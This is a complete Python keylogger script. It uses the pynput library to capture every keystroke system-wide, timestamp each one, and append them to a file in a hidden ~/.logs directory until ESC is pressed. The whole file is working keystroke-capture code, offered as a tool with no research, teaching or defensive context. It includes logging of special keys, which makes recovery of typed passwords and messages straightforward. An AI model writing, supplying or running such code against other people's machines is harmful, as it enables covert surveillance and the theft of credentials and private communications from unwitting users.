#!/usr/bin/env python3
"""
Keylogger - Captures and logs keystrokes
"""

import os
import sys
import time
import threading
from datetime import datetime
from pynput import keyboard
from pynput.keyboard import Key, Listener

class Keylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.log_data = ""
        self.running = False
        self.lock = threading.Lock()

    def get_timestamp(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def format_key(self, key):
        try:
            return key.char
        except AttributeError:
            if key == Key.space:
                return " "
            elif key == Key.enter:
                return "\n"
            elif key == Key.tab:
                return "\t"
            elif key == Key.backspace:
                return "[BACKSPACE]"
            elif key == Key.shift:
                return "[SHIFT]"
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                return "[CTRL]"
            elif key == Key.alt_l or key == Key.alt_r:
                return "[ALT]"
            elif key == Key.caps_lock:
                return "[CAPS]"
            elif key == Key.esc:
                return "[ESC]"
            elif key == Key.up:
                return "[UP]"
            elif key == Key.down:
                return "[DOWN]"
            elif key == Key.left:
                return "[LEFT]"
            elif key == Key.right:
                return "[RIGHT]"
            elif key == Key.delete:
                return "[DELETE]"
            else:
                return f"[{key.name.upper()}]"

    def on_press(self, key):
        timestamp = self.get_timestamp()
        formatted_key = self.format_key(key)

        with self.lock:
            entry = f"[{timestamp}] {formatted_key}\n"
            self.log_data += entry

            self.flush_to_file()

    def on_release(self, key):
        if key == Key.esc:
            return False

    def flush_to_file(self):
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(self.log_data)
            self.log_data = ""
        except Exception as e:
            print(f"Error writing to log file: {e}", file=sys.stderr)

    def start(self):
        self.running = True

        print(f"[*] Keylogger started at {self.get_timestamp()}")
        print(f"[*] Logging to: {os.path.abspath(self.log_file)}")
        print("[*] Press ESC to stop...\n")

        try:
            with Listener(
                on_press=self.on_press,
                on_release=self.on_release
            ) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("\n[*] Keylogger interrupted")
        except Exception as e:
            print(f"[!] Error: {e}", file=sys.stderr)
        finally:
            self.stop()

    def stop(self):
        self.running = False
        if self.log_data:
            self.flush_to_file()
        print(f"[*] Keylogger stopped at {self.get_timestamp()}")

def main():
    log_dir = os.path.expanduser("~/.logs")
    os.makedirs(log_dir, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = os.path.join(log_dir, f"keylog_{timestamp}.txt")

    keylogger = Keylogger(log_file=log_file)
    keylogger.start()

if __name__ == "__main__":
    main()
